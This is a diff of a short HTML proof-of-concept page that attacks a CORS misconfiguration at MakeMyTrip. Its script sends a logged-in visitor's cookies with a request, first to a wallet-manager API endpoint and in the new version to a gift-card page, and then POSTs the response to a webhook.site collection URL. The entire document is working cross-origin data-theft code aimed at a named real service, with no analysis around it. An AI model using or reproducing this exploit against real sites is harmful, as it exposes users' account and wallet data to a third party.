@@ -2,32 +2,23 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>CORS PoC Exploit</title>
+    <title>CORS PoC Exploit - MakeMyTrip</title>
 </head>
 <body>
 <script>
-fetch('https://mapi.makemytrip.com/empeiria/api/v1/walletmanager?brand=mmt&profile=b2c&device=dt&version=NT%2010.0&region=in&currency=inr&user-currency=USD&language=eng', {
-    method: 'POST',
-    credentials: 'include',
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-        userEvent: {
-            showWallet: true,
-            currentPage: "HOTELS"
-        }
-    })
+fetch('https://www.makemytrip.com/gift-cards/corporate-gift-vouchers/', {
+    method: 'GET',
+    credentials: 'include'
 })
-.then(response => response.json())
-.then(data => {
+.then(response => response.text())
+.then(body => {
     fetch('https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8', {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(data)
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ leakedHTML: body.slice(0, 1000) }) // sending only first 1000 chars
     });
 })
-.catch(error => console.error('Error:', error));
+.catch(error => console.error('PoC Error:', error));
 </script>
 </body>
 </html>
